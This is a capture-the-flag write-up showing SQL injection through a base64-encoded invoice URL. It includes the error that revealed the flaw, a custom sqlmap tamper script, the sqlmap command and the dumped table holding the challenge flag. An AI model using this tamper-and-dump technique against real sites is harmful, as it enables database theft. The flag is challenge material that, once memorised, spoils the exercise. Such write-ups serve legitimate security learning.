<h1>Stonks Street Journal</h1>

<h2>Solution</h2>

<p>After signing up on the website, we can view our invoice. The invoice URL appears to be in the format <code>/legacy_invoice_system/BASE64_ENCODED_STRING</code>.</p>

<p>This base64-encoded string decodes to <code>USERNAME-YEAR-MONTH-DAY</code></p>

<p>Adding a <code>'</code> to the back of the username yielded an SQL error:</p>

<p><code>
syntax error at or near "2021"
LINE 1: ...riber WHERE username='zeyu2001'' AND signup_date='2021-11-27...
                                                             ^
</code></p>

<p>It appears that the input string is split into the username and signup date, and both are passed into the SQL query without sanitization.</p>

<p>We can use a custom SQLMap tamper script that appends the payload to the back of the signup date, and then base64-encodes the entire input string before passing it into the custom injection point at <code>GET /legacy_invoice_system/*</code></p>

<p>```python
import base64
from lib.core.enums import PRIORITY</p>

<h1>Define which is the order of application of tamper scripts against the payload</h1>

<p><strong>priority</strong> = PRIORITY.NORMAL</p>

<p>def tamper(payload, **kwargs):</p>

<pre><code>retVal = base64.b64encode(('zeyu2001-2021-11-27' + payload).encode()).decode()

return retVal
</code></pre>

<p>```</p>

<p>Running <code>sqlmap -r invoice.req --tamper tamper.py --threads 10 -T news_article --dump</code>, we can dump the database which contains the flag.</p>

<p><code>
Database: public
Table: news_article
[4 entries]
+----+---------------------------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------+
| id | text                                              | headline                                                                                                                                              | publish_time                  |
+----+---------------------------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------+
| 1  | My most favourite flag was: CSR{welc0me_0n_b0ard} | Flags are sometimes hard to find, but always beautiful                                                                                                | 2021-11-26 08:33:33.159482+00 |
| 2  | &lt;blank&gt;                                           | Elin [Nordegren] said I was obsessed with golf, but when I started sleeping with other women, that wasnâ€™t good enough either.                         | 2021-11-26 08:33:33.166128+00 |
| 3  | &lt;blank&gt;                                           | Struggling to stay on their feet as they stood outside their assigned polling place, the nine members of the U.S. Supreme Court reportedly            | 2021-11-26 08:33:33.16646+00  |
| 4  | &lt;blank&gt;                                           | Former U.S. secretary of defense Donald Rumsfeld passed away Wednesday at 88 years old, sources confirmed, and is survived by 1 million fewer Iraqis. | 2021-11-26 08:33:33.166761+00 |
+----+---------------------------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------+
</code></p>
